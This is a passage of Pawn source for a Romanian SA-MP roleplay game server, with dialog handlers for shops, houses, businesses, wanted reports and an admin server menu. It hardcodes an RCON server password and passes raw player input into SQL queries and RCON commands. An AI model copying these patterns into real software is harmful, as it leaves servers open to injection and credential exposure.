					ServerWeapon(playerid, 12, 1);
					GivePlayerCash(playerid, -50000);
					SendClientMessage(playerid,COLOR_WHITE,"Ai cumparat Vibrator.");
					BizzInfo[6][bBalance] += 50000;
				}
				case 2: {
					if(GetPlayerCash(playerid) < 50000) return SendClientMessage(playerid, COLOR_GREY, "Nu ai banii necesari pentru a cumpara acest lucru!");
					ServerWeapon(playerid, 13, 1);
					GivePlayerCash(playerid, -50000);
					SendClientMessage(playerid,COLOR_WHITE,"Ai cumparat Silver Vibrator.");
					BizzInfo[6][bBalance] += 50000;
				}
				case 3: {
					if(GetPlayerCash(playerid) < 100000) return SendClientMessage(playerid, COLOR_GREY, "Nu ai banii necesari pentru a cumpara acest lucru!");
					ServerWeapon(playerid, 14, 1);
					GivePlayerCash(playerid, -100000);
					SendClientMessage(playerid,COLOR_WHITE,"Ai cumparat flori.");
					BizzInfo[6][bBalance] += 100000;
				}		
			}
			mysql_format(SQL, string, sizeof(string), "UPDATE `bizz` SET `Till`='%d',`Products`='%d' WHERE `ID`='7'",BizzInfo[6][bBalance],BizzInfo[6][bProducts]);
			mysql_tquery(SQL,string, "", "");
		}		
		case DIALOG_STAFF: {
			if(!response) return true;
			switch(listitem) {
				case 0: {
					mysql_format(SQL, gQuery, 128, "SELECT * FROM `users` WHERE `Admin`>'0' ORDER BY `users`.`Admin` ASC LIMIT 50");
					mysql_tquery(SQL, gQuery, "SQL_cache_staff_admins", "i", playerid);		
				}
				case 1: {
					mysql_format(SQL, gQuery, 128, "SELECT * FROM `users` WHERE `Helper`>'0' ORDER BY `users`.`Helper` ASC LIMIT 50");
					mysql_tquery(SQL, gQuery, "SQL_cache_staff_helpers", "i", playerid);		
				}
				case 2: {
					mysql_format(SQL, gQuery, 128, "SELECT * FROM `users` WHERE `Rank`='7' ORDER BY `users`.`Leader` ASC LIMIT 50");
					mysql_tquery(SQL, gQuery, "SQL_cache_staff_leaders", "i", playerid);		
				}
			}
		}
		case DIALOG_STAFF2: if(!response) return ShowPlayerDialog(playerid, DIALOG_STAFF, DIALOG_STYLE_LIST, "Staff", "Admins\nHelpers", "Ok", "Close");
		case DIALOG_SYSTEMS: {
			if(!response) return true;
			switch(ServerSystem[listitem]) {
				case 0: ServerSystem[listitem] = 1;	
				case 1: ServerSystem[listitem] = 0;
			}
			format(string, sizeof(string), "Warning: %s a %s sistemul '%s'.", GetName(playerid), (ServerSystem[listitem] == 0) ? ("activat") : ("dezactivat"), SystemName(listitem));
			SendAdminMessage(COLOR_WARNING, string, 5);	
		}		
		case DIALOG_WHEELS: {
			if(!response) 
				return true;
			
			new idd = PersonalCar(playerid);
			if(idd == -1) 
				return true;

			PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
			switch(listitem) {
				case 0: SaveTunning(idd, GetVehicleComponentType(1073), 1073), AddVehicleComponent(CarInfo[idd][Spawned], 1073);
				case 1: SaveTunning(idd, GetVehicleComponentType(1079), 1079), AddVehicleComponent(CarInfo[idd][Spawned], 1079);
				case 2: SaveTunning(idd, GetVehicleComponentType(1080), 1080), AddVehicleComponent(CarInfo[idd][Spawned], 1080);
				case 3: SaveTunning(idd, GetVehicleComponentType(1083), 1083), AddVehicleComponent(CarInfo[idd][Spawned], 1083);
			} 
			SendClientMessage(playerid, COLOR_YELLOW, "Modificari actualizate!");
			BizzInfo[29][bBalance] += 50;				
		}
		case DIALOG_SPAWNCHANGE: {
			if(!response) return true;
			switch(listitem) {
				case 0: {
					if(PlayerInfo[playerid][pHouse] == 999) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu ai o casa/chirie!");
					SendClientMessage(playerid, COLOR_LGREEN, "You will now spawn at your house (or rent house).");
					SpawnChange[playerid] = 1;	
					UpdateVar(playerid, "SpawnChange", 1);		
				}
				case 1: {
					switch(PlayerInfo[playerid][pMember]) {
						case 0: {
							SendClientMessage(playerid, COLOR_LGREEN, "You will now spawn at spawn.");
						}
						case 1,2,3,14,19: {
							ShowPlayerDialog(playerid, DIALOG_SPAWNCHANGE_DEP, DIALOG_STYLE_LIST, "Select HQ", "\
							Los Santos Police Department's HQ\n\
							Federal Bureau of Investigations's HQ\n\
							National Guard's HQ\n\
							Las Venturas Police Department's HQ\n\
							San Fierro Police Department's HQ", "Select", "Back");
						}
						case 7,16,21: {
							ShowPlayerDialog(playerid, DIALOG_SPAWNCHANGE_SI, DIALOG_STYLE_LIST, "Select HQ", "\
							School Instructors LS's HQ\n\
							School Instructors LV's HQ\n\
							School Instructors SF's HQ", "Select", "Back");
						}
						case 13,20: {
							ShowPlayerDialog(playerid, DIALOG_SPAWNCHANGE_PARA, DIALOG_STYLE_LIST, "Select HQ", "\
							Paramedic Department's HQ\n\
							San Fierro Paramedic Department's HQ", "Select", "Back");
						}
						case 12,15,23: {
							ShowPlayerDialog(playerid, DIALOG_SPAWNCHANGE_TRAN, DIALOG_STYLE_LIST, "Select HQ", "\
							Yango's HQ\n\
							Taxi Company's HQ\n\
							Uber Company's HQ", "Select", "Back");
						}
						case 8,22: {
							ShowPlayerDialog(playerid, DIALOG_SPAWNCHANGE_TTC, DIALOG_STYLE_LIST, "Select HQ", "\
							Tow Truck Company's HQ\n\
							Tow Truck Company SF's HQ", "Select", "Back");
						}
					}
					SpawnChange[playerid] = 0;	
					UpdateVar(playerid, "SpawnChange", 0);		
				}
				case 2: {
					if(ClanInfo[PlayerInfo[playerid][pClan]][clHQ] == 0) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Clanul tau nu detine un HQ!");
					SendClientMessage(playerid, COLOR_LGREEN, "You will now spawn at clan HQ.");
					SpawnChange[playerid] = 2;
					UpdateVar(playerid, "SpawnChange", 2);
				}		
			}
		}
		case DIALOG_BUYGUN2: {
			if(!response) return true;
			switch(listitem) {
				case 0: ServerWeapon(playerid, 24, 50);		
				case 1: ServerWeapon(playerid, 31, 200);			
				case 2: ServerWeapon(playerid, 30, 200);	
				case 3: ServerWeapon(playerid, 28, 200);			
				case 4: ServerWeapon(playerid, 25, 20);					
			}
		}
		case DIALOG_SUSPECT: {
			if(!response) return true;
			new id = listitemm[playerid],i=listitem,level = wantedList[i][0];
			if !IsPlayerConnected(id) *then 
				return SendClientMessage(playerid, COLOR_GREY, "Acel player nu mai este conectat!");

			PlayerInfo[id][pWantedLevel] = level+PlayerInfo[id][pWantedLevel]<6?level+PlayerInfo[id][pWantedLevel]:6;
			format(PlayerInfo[id][pCrime], 64, "complice - reporter: %s", wantedName(i), GetName(playerid));
			_query("UPDATE `users` SET `crime` = '%s' WHERE `id` = '%i'", PlayerInfo[id][pCrime], PlayerInfo[id][pSQLID]);
			SetPlayerWantedLevel(id,PlayerInfo[id][pWantedLevel]);
			SCMf(id, COLOR_WARNING, "Ai comis o infactiune: %s, raportat de: %s. W: +%d. Nivel urmarire nou: %d.",wantedName(i),GetName(playerid),level,PlayerInfo[id][pWantedLevel]);
			SendTeamMessage(1, 0x2e64feFF, "Dispatch: %s [%d] has commited a crime: %s. Reporter: %s. W: +%d. New wanted level: %d.",GetName(id),id,wantedName(i),GetName(playerid),level,PlayerInfo[id][pWantedLevel]);
			PlayCopSound();
			WantedTime[id] = 15 * 60;
			foreach(new x : StreamedPlayer[id]) {
				if !IsACop(x) || !OnDuty[x] *then continue;
				SetPlayerMarkerForPlayer(x, id, 0xe3336d00);
			}
		}
		case DIALOG_EDITSF: {
			if(!response) return true;
			SelectedItem[playerid] = listitem+1;
			format(string, sizeof(string), "Position\t(%f, %f, %f)\nRange\t%d", SafeZone[listitem+1][szX], SafeZone[listitem+1][szY], SafeZone[listitem+1][szZ], SafeZone[listitem+1][szRange]);
			new title[180];
			format(title, sizeof(title), "Edit safe zone %d", listitem+1);
		    ShowPlayerDialog(playerid, DIALOG_EDITSF1, DIALOG_STYLE_TABLIST, title, string, "Select", "Cancel");
		}
		case DIALOG_EDITSF1: {
			if(!response) return true;
			switch(listitem) {
			    case 0: ShowPlayerDialog(playerid, DIALOG_EDITSF2, DIALOG_STYLE_INPUT, "Position:", "Scrie putin mai jos valoarea pe care vrei sa o aiba aceasta variabila.\nUSAGE: x, y, z", "Ok", "Iesi");
				case 1: ShowPlayerDialog(playerid, DIALOG_EDITSF2, DIALOG_STYLE_INPUT, "Range:", "Scrie putin mai jos valoarea pe care vrei sa o aiba aceasta variabila.", "Ok", "Iesi");
			}
			EditJob[playerid] = listitem;
		}
		case DIALOG_EDITSF2: {
			if(!response) return true;
			new job = SelectedItem[playerid];
			new amount = strval(inputtext);
		    switch(EditJob[playerid]) {
				case 0: {
					new Float: Pos[3];
					if(sscanf(inputtext, "fff", Pos[0], Pos[1], Pos[2])) return SendClientMessage(playerid, -1, "Invalid syntax!");
					SafeZone[job][szX] = Pos[0];
					SafeZone[job][szY] = Pos[1];
					SafeZone[job][szZ] = Pos[2];
					DestroyDynamicArea(SafeZone[job][szArea]);
					SafeZone[job][szArea] = CreateDynamicCircle(SafeZone[job][szX], SafeZone[job][szY], SafeZone[job][szRange]);
					AreaID[SafeZone[job][szArea]] = job;
					AreaType[SafeZone[job][szArea]] = AREA_SAFEZONE;
 					format(string, sizeof(string), "Ai modificat 'Pozitiile' la jobul cu ID-ul %d, in: %f, %f, %f.", job, Pos[0], Pos[1], Pos[2]);
					SendClientMessage(playerid, COLOR_WHITE, string);
					mysql_format(SQL, query, sizeof(query), "UPDATE `safezones` SET `X`='%f', `Y`='%f', `Z`='%f' WHERE `ID`='%d'", Pos[0], Pos[1], Pos[2], job);
					mysql_tquery(SQL, query, "", "");
				}
				case 1: {
					SafeZone[job][szRange] = amount;
					DestroyDynamicArea(SafeZone[job][szArea]);
					SafeZone[job][szArea] = CreateDynamicCircle(SafeZone[job][szX], SafeZone[job][szY], SafeZone[job][szRange]);
					AreaID[SafeZone[job][szArea]] = job;
					AreaType[SafeZone[job][szArea]] = AREA_SAFEZONE;
					format(string, sizeof(string), "Ai modificat 'Raza' la safezone-ul cu ID-ul %d, in: %d.", job, amount);
					SendClientMessage(playerid, COLOR_WHITE, string);
					mysql_format(SQL, query, sizeof(query), "UPDATE `safezones` SET `Range`='%d' WHERE `ID`='%d'", amount, job);
					mysql_tquery(SQL, query, "", "");
				}
			}
		}
		case DIALOG_BMENU: {
			if(!response) return true;
			new biz = PlayerInfo[playerid][pBizz];
			switch(listitem) {
				case 0: {
					format(string, sizeof(string), "Nume: %s\nTaxa: $%s\nDepozit: $%s", BizzInfo[biz][bMessage], FormatNumber(BizzInfo[biz][bFee]), FormatNumber(BizzInfo[biz][bBalance]));
					ShowPlayerDialog(playerid, 0, DIALOG_STYLE_MSGBOX, "Informatii", string, "Ok", "");
				}
				case 1: {
					format(string, sizeof(string), "In depozitul afacerii sunt $%s\nScrie mai jos suma pe care doresti s-o scoti!\nPentru a scoate o suma de bani, trebuie sa fii in interiorul afacerii!", FormatNumber(BizzInfo[biz][bBalance]));
					ShowPlayerDialog(playerid, DIALOG_BMENU1, DIALOG_STYLE_INPUT, "Depozit", string, "Ok", "Inapoi");
				}
				case 2: {
					if(BizzInfo[biz][bLocked] == 1) {
						BizzInfo[biz][bLocked] = 0;
						SendClientMessage(playerid, COLOR_LGREEN, "Afacerea ta a fost deschisa!");
					}
					else if(BizzInfo[biz][bLocked] == 0) {
						BizzInfo[biz][bLocked] = 1;
						SendClientMessage(playerid, COLOR_LGREEN, "Afacerea ta a fost inchisa!");
					}
					mysql_format(SQL, query, sizeof(query),"UPDATE `bizz` SET `Locked`='%s' WHERE `ID`='%d'",BizzInfo[biz][bLocked], BizzInfo[biz][bID]);
					mysql_tquery(SQL,query, "", "");
				}
				case 3: ShowPlayerDialog(playerid, DIALOG_BMENU1, DIALOG_STYLE_INPUT, "Seteaza numele", "Scrie mai jos numele pe care vrei sa-l aiba afacerea.", "Ok", "Inapoi");
				case 4: ShowPlayerDialog(playerid, DIALOG_BMENU1, DIALOG_STYLE_INPUT, "Seteaza taxa", "Scrie mai jos taxa pe care vrei sa fie la intrarea in afacere.\n", "Ok", "Inapoi");
				case 5: {
					if(TradeID[playerid] != -1) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu poti folosi aceasta comanda atata timp cat esti implicat intr-o afacere!");
					ShowPlayerDialog(playerid, DIALOG_BMENU1, DIALOG_STYLE_INPUT, "Vinde afacerea", "Scrie mai jos suma cu care vrei sa-ti vinzi afacerea.\nGandeste-te bine inainte de a face aceasta alegere.\nDaca vrei s-o scoti din vanzare, pune 0$ si se va scoate automat.", "Ok", "Inapoi");
				}
				case 6: {
					if(BizzInfo[biz][bRadio] == -1) return SendClientMessage(playerid, -1, "Nu ai un radio. Il poti cumpara din /shop cu 15 Premium Points.");
					gString[0] = (EOS);
					strcat(gString, "Nume\tAscultatori\n{FF3838}Turn OFF Radio\n");
					for(new i = 1; i < sizeof(RadioNames); i++) {
						format(gQuery, 80, "%s\t%d\n", RadioNames[i], ListenThisRadio(i));
						strcat(gString, gQuery);
					}
					ShowPlayerDialog(playerid, DIALOG_BRADIO, DIALOG_STYLE_TABLIST_HEADERS, "Business Radio", gString, "Ok", "Close");	
				}
			}
			SelectedItem[playerid] = listitem;
		}
		case DIALOG_BMENU1: {
			new biz = PlayerInfo[playerid][pBizz];
			if(!response) {
				if(biz == 255) return SendClientMessage(playerid, COLOR_GREY, "Nu ai o afacere!");
				new open[64];
				if(biz < 100) {
					if(BizzInfo[biz][bLocked] == 0) open = "Inchide usa";
					else open = "Deschide usa";
				}
				else open = "Inchide usa";
				format(string, sizeof(string), "Informatii\nDepozit\n%s\nSeteaza numele\nSeteaza taxa\nVinde afacerea\nRadio", open);
				ShowPlayerDialog(playerid, DIALOG_BMENU, DIALOG_STYLE_LIST, "Business menu", string, "Ok", "Exit");			
				return true;
			}
			new suma = strval(inputtext);
			switch(SelectedItem[playerid]) {
				case 1: {
					if(suma > BizzInfo[biz][bBalance] || suma < 1) return SendClientMessage(playerid, COLOR_GREY, "Nu ai aceasta suma!");
					if(!PlayerToPoint(50, playerid,BizzInfo[biz][bExitX],BizzInfo[biz][bExitY],BizzInfo[biz][bExitZ]) && BizzInfo[biz][bStatic] == 0) return SendClientMessage(playerid, COLOR_GREY, "Nu esti langa afacerea ta!");
					else if(!PlayerToPoint(5, playerid,BizzInfo[biz][bEntranceX],BizzInfo[biz][bEntranceY],BizzInfo[biz][bEntranceZ]) && BizzInfo[biz][bStatic] == 1) return SendClientMessage(playerid, COLOR_GREY, "Nu esti langa afacerea ta!");
					GivePlayerCash(playerid, suma);
					BizzInfo[biz][bBalance] -= suma;
					format(string, sizeof(string), "Ai scos $%s din depozit. Acum mai sunt $%s.", FormatNumber(suma),FormatNumber(BizzInfo[biz][bBalance]));
					SendClientMessage(playerid, COLOR_MONEY, string);
					mysql_format(SQL, query, sizeof(query),"UPDATE `bizz` SET `Till`='%d' WHERE `ID`='%d'",BizzInfo[biz][bBalance], BizzInfo[biz][bID]);
					mysql_tquery(SQL,query, "", "");	
				}
				case 3: {
					if(strlen(inputtext) < 5 || strlen(inputtext) > 60) return SendClientMessage(playerid, COLOR_GREY, "Numele trebuie sa contina intre 5 si 60 de caractere!");
					strmid(BizzInfo[biz][bMessage], inputtext, 0, 64, 255);
					format(string, sizeof(string), "Numele afacerii a fost modificat in '%s'.",BizzInfo[biz][bMessage]);
					SendClientMessage(playerid, COLOR_LGREEN, string);
					mysql_format(SQL, query, sizeof(query),"UPDATE bizz SET Message='%s' WHERE ID='%d'",BizzInfo[biz][bMessage], BizzInfo[biz][bID]);
					mysql_tquery(SQL,query, "", "");
					UpdateLabel(2, biz);		
				}
				case 4: {
					if(suma > 2000 || suma < 1) return SendClientMessage(playerid, COLOR_GREY, "La afacerea ta poti pune maxim $2000 ca taxa.");			
					BizzInfo[biz][bFee] = suma;
					format(string, sizeof(string), "Taxa este acum de $%s.", FormatNumber(BizzInfo[biz][bFee]));
					SendClientMessage(playerid, COLOR_LGREEN, string);
					mysql_format(SQL, query, sizeof(query),"UPDATE `bizz` SET `EntranceCost`='%d' WHERE `ID`='%d'",BizzInfo[biz][bFee], BizzInfo[biz][bID]);
					mysql_tquery(SQL,query, "", "");
					UpdateLabel(2,biz);		
				}
				case 5: {
					if(suma < 0 || suma > 50000000) return SendClientMessage(playerid, COLOR_GREY, "Invalid suma! ($1-$50,000,000)");
					format(string, sizeof(string), "Ai setat pretul afacerii la $%s.", FormatNumber(suma));
					SendClientMessage(playerid, COLOR_MONEY, string);
					BizzInfo[biz][bBuyPrice]= suma;
					mysql_format(SQL, query, sizeof(query), "UPDATE `bizz` SET `BuyPrice`= '%d' WHERE `ID`= '%d'", suma, BizzInfo[biz][bID]);
					mysql_tquery(SQL,query, "", "");
					UpdateLabel(2,biz);
					format(string, sizeof(string), "%s si-a pus afacerea (%d) la vanzare pentru suma de $%s.", GetName(playerid), biz, FormatNumber(suma));
					InsertLog(playerid, string, LOG_SELL);				
				}
			}
		}		
		case DIALOG_HMENU: {
			if(!response) return true;			
			if(PlayerInfo[playerid][pHouse] != 999 && strcmp(GetName(playerid), HouseInfo[PlayerInfo[playerid][pHouse]][hOwner], true) == 0) { }
			else return SendClientMessage(playerid, COLOR_GREY, "Nu ai o casa!");			
			new house = PlayerInfo[playerid][pHouse];
			switch(listitem) {
				case 0: {
					mysql_format(SQL, gQuery, 128, "SELECT * FROM `users` WHERE `House` = '%i' AND `Status` = '-1'", house);
					mysql_tquery(SQL, gQuery, "sql_cache_renters", "ii", playerid, house);
				}
				case 1: showRenters(playerid);
				case 2: {
					format(string, sizeof(string), "In depozitul casei sunt $%s\nScrie mai jos suma pe care doresti s-o scoti!\nPentru a scoate o suma de bani, trebuie sa fii in interiorul casei!", FormatNumber(HouseInfo[house][hTakings]));
					ShowPlayerDialog(playerid, DIALOG_HMENU1, DIALOG_STYLE_INPUT, "Depozit", string, "Ok", "Inapoi");
				}
				case 3: {
					if(!PlayerToPoint(5, playerid,HouseInfo[house][hEntrancex], HouseInfo[house][hEntrancey], HouseInfo[house][hEntrancez]) || PlayerToPoint(3, playerid,HouseInfo[house][hExitx], HouseInfo[house][hExity], HouseInfo[house][hExitz]))
						return SendClientMessage(playerid, COLOR_GREY, "Nu esti langa usa casei!");
						
					if(HouseInfo[house][hLock] == 1) {
						HouseInfo[house][hLock] = 0;
						SendClientMessage(playerid, COLOR_LGREEN, "Ai deschis usa casei!");
					}
					else if(HouseInfo[house][hLock] == 0) {
						HouseInfo[house][hLock] = 1;
						SendClientMessage(playerid, COLOR_LGREEN, "Ai inchis usa casei!");
					}	
					PlayerPlaySound(playerid, 1145, 0.0, 0.0, 0.0);
					mysql_format(SQL, query, sizeof(query),"UPDATE `houses` SET `Lockk`='%d' WHERE `ID`='%d'",HouseInfo[house][hLock], HouseInfo[house][hID]);
					mysql_tquery(SQL,query, "", "");
				}
				case 4: ShowPlayerDialog(playerid, DIALOG_HMENU1, DIALOG_STYLE_LIST, "House upgrade", "Health Upgrade ($500)\nArmour Upgrade ($1000)", "Ok", "Inapoi");
				case 5: ShowPlayerDialog(playerid, DIALOG_HMENU1, DIALOG_STYLE_INPUT, "Seteaza numele", "Scrie mai jos numele pe care vrei sa-l aiba casa.", "Ok", "Inapoi");
				case 6: ShowPlayerDialog(playerid, DIALOG_HMENU3, DIALOG_STYLE_MSGBOX, "Chirie:", "Vrei sa ai chirie la aceasta casa?", "Yes", "No");
				case 7: {
					if(TradeID[playerid] != -1) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu poti folosi aceasta comanda atata timp cat esti implicat intr-o afacere!");
					ShowPlayerDialog(playerid, DIALOG_HMENU1, DIALOG_STYLE_INPUT, "Vinde casa", "Scrie mai jos suma cu care vrei sa-ti vinzi casa.\nGandeste-te bine inainte de a face aceasta alegere.\nDaca vrei s-o scoti din vanzare, pune 0$ si se va scoate automat.", "Ok", "Inapoi"); 
				}
				case 8: {
					if(HouseInfo[house][hRadio] == -1) return SendClientMessage(playerid, -1, "Nu ai un radio. Il poti cumpara din /shop cu 15 Premium Points.");
					gString[0] = (EOS);
					strcat(gString, "Nume\tAscultatori\n{FF3838}Turn OFF Radio\n");
					for(new i = 1; i < sizeof(RadioNames); i++) {
						format(gQuery, 80, "%s\t%d\n", RadioNames[i], ListenThisRadio(i));
						strcat(gString, gQuery);
					}
					ShowPlayerDialog(playerid, DIALOG_HRADIO, DIALOG_STYLE_TABLIST_HEADERS, "House Radio", gString, "Ok", "Close");
    			}
			}
			SelectedItem[playerid] = listitem;
		}	
		case DIALOG_HMENU1: {
			if(!response) {
				if(PlayerInfo[playerid][pHouse] != 999 && strcmp(GetName(playerid), HouseInfo[PlayerInfo[playerid][pHouse]][hOwner], true) == 0) {
					new open[64];
					if(HouseInfo[PlayerInfo[playerid][pHouse]][hLock] == 0) open = "Inchide usa";
					else open = "Deschide usa";
					format(string, sizeof(string), "Informatii\nChiriasi\nDepozit\n%s\nHouse upgrade\nSeteaza numele\nSeteaza chiria\nVinde casa\nRadio\nHouse Upgrade", open);
					ShowPlayerDialog(playerid, DIALOG_HMENU, DIALOG_STYLE_LIST, "House menu", string, "Ok", "Exit");
				}
				else SendClientMessage(playerid, COLOR_GREY, "Nu ai o casa!");			
				return true;
			}
			if(PlayerInfo[playerid][pHouse] != 999 && strcmp(GetName(playerid), HouseInfo[PlayerInfo[playerid][pHouse]][hOwner], true) == 0) { }
			else return SendClientMessage(playerid, COLOR_GREY, "Nu ai o casa!");
			new suma = strval(inputtext), house = PlayerInfo[playerid][pHouse];
			switch(SelectedItem[playerid]) {
				case 2: {
					if(suma > HouseInfo[house][hTakings] || suma < 1) return SendClientMessage(playerid, COLOR_GREY, "Nu ai aceasta suma de bani in depozitul casei!");
					if(!PlayerToPoint(100, playerid,HouseInfo[house][hExitx],HouseInfo[house][hExity],HouseInfo[house][hExitz])) return SendClientMessage(playerid, COLOR_GREY, "Nu esti in casa ta!");
					GivePlayerCash(playerid, suma);
					HouseInfo[house][hTakings] -= suma;
					format(string, sizeof(string), "Ai scos $%s din depozit. Acum mai ai: $%s", FormatNumber(suma),FormatNumber(HouseInfo[house][hTakings]));
					SendClientMessage(playerid, COLOR_MONEY, string);
					mysql_format(SQL, query, sizeof(query),"UPDATE `houses` SET `Takings`='%d' WHERE `ID`='%d'",HouseInfo[house][hTakings],HouseInfo[house][hID]);
					mysql_tquery(SQL,query, "", "");
				}	
				case 4: {
					switch(listitem) {
						case 0:
						{
							if(GetPlayerCash(playerid) < 500) return SendClientMessage(playerid, COLOR_GREY, "Nu ai destui bani!");
							if(HouseInfo[house][hHel] == 1) return SendClientMessage(playerid, COLOR_GREY, "Casa ta are deja acest item!");
							HouseInfo[house][hHel] = 1;
							GivePlayerCash(playerid, -500);
							
							BizzInfo[18][bBalance] += 500;
							mysql_format(SQL,query, sizeof(query),"UPDATE `bizz` SET `Till`='%d' WHERE `ID`='18'",BizzInfo[18][bBalance]);
							mysql_tquery(SQL,query, "", "");
					
							PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
							mysql_format(SQL,query, sizeof(query),"UPDATE `houses` SET `Hel`='1' WHERE `ID`='%d'",HouseInfo[house][hID]);
       						mysql_tquery(SQL,query, "", "");
						}
						case 1:
						{
							if(!IsACop(playerid)) return SendClientMessage(playerid, COLOR_GREY, "Nu esti politist!");
							if(GetPlayerCash(playerid) < 1000) return SendClientMessage(playerid, COLOR_GREY, "Nu ai destui bani!");
							if(HouseInfo[house][hArm] == 1) return SendClientMessage(playerid, COLOR_GREY, "Casa ta are deja acest item!");
							HouseInfo[house][hArm] = 1;
							GivePlayerCash(playerid, -1000);
							BizzInfo[18][bBalance] += 1000;
							mysql_format(SQL, query, sizeof(query),"UPDATE `bizz` SET `Till`='%d' WHERE `ID`='18'",BizzInfo[18][bBalance]);
							mysql_tquery(SQL,query, "", "");
							PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
							mysql_format(SQL, query, sizeof(query),"UPDATE `houses` SET `Arm`='1' WHERE `ID`='%d'",HouseInfo[house][hID]);
							mysql_tquery(SQL,query, "", "");
						}
					}
					SendClientMessage(playerid, COLOR_LGREEN, "Casa a fost actualizata! Foloseste comanda '/heal' pentru a lua viata.");
				}
				case 5: {
					if(strlen(inputtext) < 5 || strlen(inputtext) > 60) return SendClientMessage(playerid, COLOR_GREY, "Numele trebuie sa contina intre 5 si 60 de caractere!");
					format(HouseInfo[house][hDiscription], 256, inputtext);
					format(string, sizeof(string), "Numele casei a fost modificat in '%s'.",HouseInfo[house][hDiscription]);
					SendClientMessage(playerid, COLOR_LGREEN, string);
					mysql_format(SQL, query, sizeof(query),"UPDATE houses SET Discription='%s' WHERE ID='%d'",HouseInfo[house][hDiscription],PlayerInfo[playerid][pHouse]);
					mysql_tquery(SQL,query, "", "");
					UpdateLabel(1, house);					
				}
				case 7: {
					if(suma < 0 || suma > 300000000) return SendClientMessage(playerid, COLOR_GREY, "Invalid price! ($1-$300,000,000)");
					format(string, sizeof(string), "Ai setat pretul casei la $%s.", FormatNumber(suma));
					SendClientMessage(playerid, COLOR_MONEY, string);
					HouseInfo[house][hValue] = suma;
					mysql_format(SQL, query, sizeof(query), "UPDATE `houses` SET `Value`= '%d' WHERE `ID`= '%d'", HouseInfo[house][hValue], HouseInfo[house][hID]);
					mysql_tquery(SQL, query, "", "");
					UpdateLabel(1,house);
					format(string, sizeof(string), "%s si-a pus casa (%d) la vanzare pentru suma de $%s.", GetName(playerid), house, FormatNumber(suma));
					InsertLog(playerid, string, LOG_SELL);				
				}
			}
		}
		case DIALOG_HMENU3: {
			new house = PlayerInfo[playerid][pHouse];
			HouseInfo[house][hRentabil] = response;
			mysql_format(SQL, query, sizeof(query), "UPDATE `houses` SET `Rentabil`='%d' WHERE `ID`='%d'", HouseInfo[house][hRentabil], HouseInfo[house][hID]);
			mysql_tquery(SQL, query, "", "");
			UpdateLabel(1, house);
		}
		case DIALOG_WANTED: {
			if(!response) return true;			
			new id = SelectedPlayers[playerid][listitem];
			if(PlayerInfo[id][pWantedLevel] == 0) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Acel player nu mai are wanted!");
			ShowMDC(playerid, id);
			UsedFind[playerid] = 1;
			new Float:X,Float:Y,Float:Z;
			GetPlayerPos(id, X,Y,Z);
			SetPlayerCheckpoint(playerid, X,Y,Z, 3.5);
			targetfind[playerid] = id;
			CP[playerid] = 53;
			format(string, sizeof(string), "* Punctul rosu a fost setat pe %s (%d) care se afla in zona %s.",GetName(id),id,GetPlayerZone(id));
			SendClientMessage(playerid,COLOR_YELLOW,string);
		
		}
		case DIALOG_SERVER: {
			if(!response) return true;
			switch(listitem) {
				case 0: ShowPlayerDialog(playerid, DIALOG_SERVER1, DIALOG_STYLE_MSGBOX, "Server menu", "Esti sigur ca vrei sa debanezi toti jucatorii?", "Da", "Nu");
				case 1: ShowPlayerDialog(playerid, DIALOG_SERVER1, DIALOG_STYLE_MSGBOX, "Server menu", "Esti sigur ca vrei sa dai restart la payday?", "Da", "Nu");
				case 2: ShowPlayerDialog(playerid, DIALOG_SERVER1, DIALOG_STYLE_MSGBOX, "Server menu", "Esti sigur ca vrei sa bagi serverul in mententanta?", "Da", "Nu");
				case 3: ShowPlayerDialog(playerid, DIALOG_SERVER1, DIALOG_STYLE_INPUT, "Server menu", "Scrie parola care doresti s-o aiba serverul\nDaca doresti s-o scoti, pune '0'.", "Ok", "Iesi");
				case 4: ShowPlayerDialog(playerid, DIALOG_SERVER1, DIALOG_STYLE_INPUT, "Server menu", "Scrie numele care doresti sa-l aiba serverul", "Ok", "Iesi");
				case 5: ShowPlayerDialog(playerid, DIALOG_SERVER1, DIALOG_STYLE_MSGBOX, "Server menu", "Esti sigur ca vrei sa stergi casele celor inactivi?", "Da", "Nu");
				case 6: ShowPlayerDialog(playerid, DIALOG_SERVER1, DIALOG_STYLE_MSGBOX, "Server menu", "Esti sigur ca vrei sa stergi afacerile celor inactivi?", "Da", "Nu");
				case 7: ShowPlayerDialog(playerid, DIALOG_SERVER1, DIALOG_STYLE_MSGBOX, "Server menu", "Esti sigur ca vrei sa resetezi quest-ul?", "Da", "Nu");
			}
			SelectedItem[playerid] = listitem;
		}
		case DIALOG_SERVER1: {
			if(!response) return true;
			switch(SelectedItem[playerid]) {
				case 0: {
					mysql_format(SQL, query, sizeof(query),"UPDATE users SET `BTemp`='0', `BYear`='0', `BMonth`='0', `BDay`='0', `Banned`='0'");
					mysql_tquery(SQL,query, "", "");
					SendClientMessage(playerid, COLOR_YELLOW, "Ai debanat toti jucatorii!");
				}
				case 1: {
					RestartPayday = true;
					SendClientMessage(playerid, COLOR_YELLOW, "Serverul se va restarta la payday-ul urmator!");
				}
				case 2: {
					foreach(new i : Player) {
						if(PlayerInfo[i][pAdmin] == 0) {
							SendClientMessage(i, COLOR_CLIENT, "Serverul a intrat in mentenanta! Va rugam sa reveniti peste cateva minute.");
							KickEx(i);
						}
						else SendClientMessage(i, COLOR_CLIENT, "Serverul a intrat in mentenanta! Nu ai primit kick deoarece esti admin.");
					}
					format(gString, sizeof gString, "hostname %s - mentenanta", serverInfo[sv_generalname]);
					SendRconCommand("password CI1232k20");
				}
				case 3: {
					format(string, sizeof(string), "password %s", inputtext);
					SendRconCommand(string);
					if(strlen(inputtext) == 0) format(string, sizeof(string), "Ai scos parola de la server!");
					else format(string, sizeof(string), "Ai pus parola '%s' la server!", inputtext);
					SendClientMessage(playerid, COLOR_YELLOW, string);
					mysql_format(SQL, gQuery, 128, "UPDATE `stuff` SET `password` = '%s'", inputtext);
					mysql_tquery(SQL, gQuery);
				}
				case 4: {
					format(string, sizeof(string), "hostname %s", inputtext);
					SendRconCommand(string);
					format(string, sizeof(string), "Ai pus numele '%s' la server!", inputtext);
